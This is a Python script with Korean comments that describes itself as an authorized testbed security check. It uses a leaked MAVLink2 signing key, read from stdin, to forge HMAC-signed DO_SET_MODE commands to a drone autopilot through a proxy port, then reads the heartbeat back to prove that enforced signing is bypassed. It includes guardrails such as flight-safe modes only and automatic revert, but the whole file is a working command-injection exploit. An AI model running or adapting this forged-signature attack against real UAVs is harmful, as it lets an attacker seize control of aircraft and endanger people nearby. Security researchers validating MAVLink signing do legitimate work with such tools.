#!/usr/bin/env python3
"""forge_sign — 유출 서명키로 MAVLink2 링크서명을 위조해 14556 오라클로 DO_SET_MODE (INJECT · D계층).

인가된 격리 테스트베드 전용 보안검증 스크립트. 전제: 노출된 MAVLink 서명키를 이미 회수했다
(계층C signkey_leak → consumes sign_key). 그 키를 stdin(R6 vault→stdin) 으로 수신해
pymavlink setup_signing(sign_outgoing=True) 으로 링크서명(HMAC-SHA256)을 계산, gcs_proxy :14556
평문 오라클로 **서명된** DO_SET_MODE 를 발신한다. 목적: '서명 강제(signing=on) 가 켜져 있어도
유출된 키로 위조 서명하면 명령이 수용됨'을 공격자-관측(같은 14556 autopilot HEARTBEAT.custom_mode
read-back)으로 실증. 오라클(oracle, signed=False → Blocked)과의 cross-tool differential 판별자가
본 스크립트의 signed=True 필드다.

★ 안전(가역·드론안전):
  · **비행안전 모드만**(GUIDED=4·LOITER=5). STABILIZE(0)/LAND(9) 목표 절대 미발행.
  · **baseline 선-read 실패(None) 시 미주입** — 가역 보장 불가면 injected 세팅 전 return.
  · **revert 를 finally 로 보장** — 주입이 나갔으면 예외 여부와 무관하게 서명된 명령으로 복원.
  · autopilot(comp==1, baseline sysid) HEARTBEAT 만 신뢰 — GCS(255)/타 소스 배제.

★ 비밀 라우팅(R6): sign_key 는 오직 stdin 의 'sign_key=<v>' 라인에서만 취득(argv/env 금지).
  키 원문·파생 대칭키·raw stdin 은 로그·stdout 에 절대 미노출(파생 직후 del, 로그는 타입/마스크만).

argv: '<ip>:14556 mode <m>' (동적 IP). 출력(stdout, INJECT 계약 · 정확히 1줄):
  {"accepted": bool, "signed": bool, "blocked_by": <str|null>, "effect": {"mode": "<int>"}}
  blocked_by 는 관측된 무효과만 보고(signing 하드코딩 금지 — 거부사유는 관측 불가).
"""
from __future__ import annotations

import os

# MAVLink2 강제 — 링크서명은 MAVLink2 전용. pymavlink import 이전에 세팅해야 유효하며,
#   pymavlink 는 함수 내부 lazy import 이므로 모듈 top-level 인 이 시점에 이미 확정됨.
os.environ.setdefault("MAVLINK20", "1")

import json
import sys
import time
from typing import Optional

FLIGHT_SAFE = (4, 5)          # 비행안전 자율모드만 주입 허용(GUIDED=4·LOITER=5)
DEFAULT_PORT = 14556          # 평문 오라클(gcs_proxy) 포트
SECRET_NAME = "sign_key"      # stdin 'name=value' 키(safeexec._encode_stdin 정합)
_EMITTED = False              # stdout 1줄 JSON 중복 방지 가드
_SIGNED = False               # setup_signing 성공 후 True(예외경로 signed 값 정직 보고)


def log(*a: object) -> None:
    """stderr `[forge_sign]` 프리픽스 진단. 비밀 값 절대 미출력(타입/마스크만)."""
    print("[forge_sign]", *a, file=sys.stderr, flush=True)


def emit(accepted: bool, blocked_by: object, mode: object = None, signed: bool = False) -> None:
    """stdout 정확히 1줄 JSON(INJECT 계약). _EMITTED 가드로 중복 방지.

    oracle emit 과 동형 — 오라클은 signed=False 고정, 본 스크립트는 위조서명 발신 시 signed=True.
    이 signed 필드가 cross-tool differential 의 판별자다(계약 shape 는 동일 보존).
    """
    global _EMITTED
    if _EMITTED:
        return
    _EMITTED = True
    out = {
        "accepted": bool(accepted),
        "signed": bool(signed),
        "blocked_by": blocked_by,
        "effect": ({"mode": str(mode)} if (accepted and mode is not None) else {}),
    }
    sys.stdout.write(json.dumps(out) + "\n")
    sys.stdout.flush()


def parse_args(argv) -> tuple[Optional[str], Optional[int]]:
    """oracle.parse_args 동일 로직: argv[1:] 공백분해, 'mode <int>' 추출, 첫 잔여토큰=endpoint."""
    toks = []
    for a in argv[1:]:
        toks.extend(str(a).split())
    mode, rest, i = None, [], 0
    while i < len(toks):
        if toks[i] == "mode" and i + 1 < len(toks):
            try:
                mode = int(toks[i + 1])
            except ValueError:
                mode = None
            i += 2
            continue
        rest.append(toks[i]); i += 1
    return (rest[0] if rest else None), mode


def conn_str(ep: Optional[str]) -> Optional[str]:
    """oracle.conn_str 동일: 스킴 없으면 'udpout:' 접두, 포트 없으면 ':14556' 보정. None->None."""
    if not ep:
        return None
    s = ep if ep.split(":", 1)[0] in ("tcp", "udp", "udpin", "udpout") else "udpout:" + ep
    sch, rest = s.split(":", 1)
    if ":" not in rest:
        rest += ":" + str(DEFAULT_PORT)
    return sch + ":" + rest


def read_stdin_secret(name: str = SECRET_NAME) -> Optional[str]:
    """stdin 의 'name=value' 라인에서 name 값 취득(safeexec._encode_stdin 정본 정합).

    sys.stdin.buffer 를 EOF 까지 read(상한 64KiB) 후 utf-8 decode, 각 라인을 첫 '=' 기준 split
    (값에 '=' 허용). name 일치 라인의 값 strip 반환. 없거나 빈 stdin(DEVNULL) -> None.
    값·raw stdin 절대 로깅 금지.
    """
    try:
        raw = sys.stdin.buffer.read(64 * 1024)
    except Exception:
        return None
    if not raw:
        return None
    try:
        text = raw.decode("utf-8")
    except Exception:
        return None
    for line in text.splitlines():
        if "=" not in line:
            continue
        k, v = line.split("=", 1)
        if k.strip() == name:
            val = v.strip()
            return val if val else None
    return None


def derive_secret_key(raw: str) -> bytes:
    """유출키 문자열 -> 정확히 32바이트 대칭키(MAVLink signing secret_key 규격).

    결정론 사다리(실키 인코딩 불명에 대한 방어):
      (1) strip 후 len==64 ∧ 전부 hex -> bytes.fromhex
      (2) base64 디코드가 정확히 32바이트면 사용
      (3) raw.encode('utf-8') 가 정확히 32바이트면 그대로
      (4) 그 외 -> hashlib.sha256(raw.encode('utf-8')).digest()  (MAVProxy passphrase 관례)
    raw·산출 키는 로깅 금지. 실패시 예외 -> main 이 no_effect 처리.
    """
    import base64
    import hashlib

    s = raw.strip()
    # (1) hex 64자 -> 32바이트
    if len(s) == 64:
        try:
            return bytes.fromhex(s)
        except ValueError:
            pass
    # (2) base64 -> 정확히 32바이트
    try:
        dec = base64.b64decode(s, validate=True)
        if len(dec) == 32:
            return dec
    except Exception:
        pass
    # (3) raw utf-8 이 정확히 32바이트
    b = raw.encode("utf-8")
    if len(b) == 32:
        return b
    # (4) sha256(passphrase) -> 32바이트
    return hashlib.sha256(raw.encode("utf-8")).digest()


def read_mode(m, sysid, timeout) -> tuple[Optional[int], Optional[int]]:
    """자동조종(comp==1, sysid 고정) HEARTBEAT.custom_mode 관측. 없으면 (None, sysid)."""
    end = time.time() + timeout
    while time.time() < end:
        msg = m.recv_match(type="HEARTBEAT", blocking=True, timeout=1.0)
        if msg is None:
            continue
        if msg.get_srcComponent() == 1 and (sysid is None or msg.get_srcSystem() == sysid):
            return int(msg.custom_mode), msg.get_srcSystem()
    return None, sysid


def send_mode(m, mode) -> None:
    """GCS HEARTBEAT(GCS 인지) x3 + DO_SET_MODE(custom_mode=mode).

    setup_signing(sign_outgoing=True) 이 켜져 있으면 이 송신은 자동으로 링크서명(HMAC-SHA256)됨 —
    별도 서명 코드 불필요. autopilot(sysid=1, comp=1) 을 타깃으로 command_long 발행.
    """
    from pymavlink import mavutil
    for _ in range(3):
        m.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
                             mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        time.sleep(0.05)
    m.mav.command_long_send(1, 1, mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                            mode, 0, 0, 0, 0, 0)


def main() -> int:
    global _SIGNED

    # 1. 타깃/모드 검증 — mode∉FLIGHT_SAFE(0/9 등)는 절대 미발행.
    endpoint, mode = parse_args(sys.argv)
    conn = conn_str(endpoint)
    if conn is None or mode is None or mode not in FLIGHT_SAFE:
        log(f"target/mode 무효(mode={mode}, 허용 {FLIGHT_SAFE}) — 주입 거부")
        emit(False, "no_effect")
        return 2

    # 2. sign_key 수신(stdin 전용, R6). 값·raw 절대 로깅 금지 — 즉시 32바이트 파생 후 del.
    key_raw = read_stdin_secret()
    if key_raw is None:
        log("서명키 미수신(stdin) — 미주입")
        emit(False, "no_effect")
        return 0
    try:
        secret = derive_secret_key(key_raw)
    except Exception as e:
        log("키 파생 실패:", type(e).__name__)
        emit(False, "no_effect")
        return 1
    finally:
        del key_raw  # 비밀 수명 최소화
    log("서명키 수신(stdin) — 32바이트 대칭키 파생 완료(값 미노출)")

    # 3. lazy import pymavlink(오프라인 py_compile 그린 유지).
    try:
        from pymavlink import mavutil
    except Exception as e:
        log("pymavlink import 실패:", type(e).__name__)
        emit(False, "no_effect")
        del secret
        return 1

    m = None
    injected = False
    baseline = None
    sysid = None
    try:
        # 4. 연결 + 서명 활성화(sign_outgoing) — 이후 모든 송신은 위조 링크서명됨.
        log(f"평문 오라클 {conn} 링크서명(위조) 활성화 · DO_SET_MODE={mode}")
        m = mavutil.mavlink_connection(conn, source_system=255, source_component=190)
        try:
            m.setup_signing(secret, sign_outgoing=True)
            _SIGNED = True
        except Exception as e:
            log("setup_signing 실패:", type(e).__name__)
            emit(False, "no_effect")
            return 1
        finally:
            del secret  # 서명 배선 후 키 소멸

        # 5. baseline 선-read — 실패(None) 시 가역 보장 불가 -> 미주입.
        baseline, sysid = read_mode(m, None, 6.0)
        if baseline is None:
            log("baseline 미관측 — 가역 보장 불가 → 미주입")
            emit(False, "no_effect", signed=True)
            return 0
        log(f"baseline custom_mode={baseline} sysid={sysid}")

        # 6. 서명된 DO_SET_MODE 주입 + readback 자기판정.
        injected = True
        log(f"서명(위조) DO_SET_MODE custom_mode={mode} 주입")
        send_mode(m, mode)
        observed = baseline
        end = time.time() + 6
        while time.time() < end:
            cur, sysid = read_mode(m, sysid, 1.5)
            if cur is not None:
                observed = cur
                if cur == mode:
                    break
        accepted = (observed is not None and observed == mode)
        log(f"readback custom_mode={observed} accepted={accepted}")
        emit(accepted, None if accepted else "no_effect", mode if accepted else None, signed=True)
        return 0
    except Exception as e:
        log("예외:", type(e).__name__)
        emit(False, "no_effect", signed=_SIGNED)
        return 1
    finally:
        # 가역 보장: 주입했고 baseline 이 비행안전이면 예외 여부와 무관하게 서명된 명령으로 복원.
        try:
            if m is not None and injected and baseline in FLIGHT_SAFE and baseline != mode:
                log(f"복원 → baseline custom_mode={baseline}(서명됨)")
                send_mode(m, baseline)
                read_mode(m, sysid, 6.0)
        except Exception as e:
            log("복원 중 예외(무시):", type(e).__name__)
        if m is not None:
            try:
                m.close()
            except Exception:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
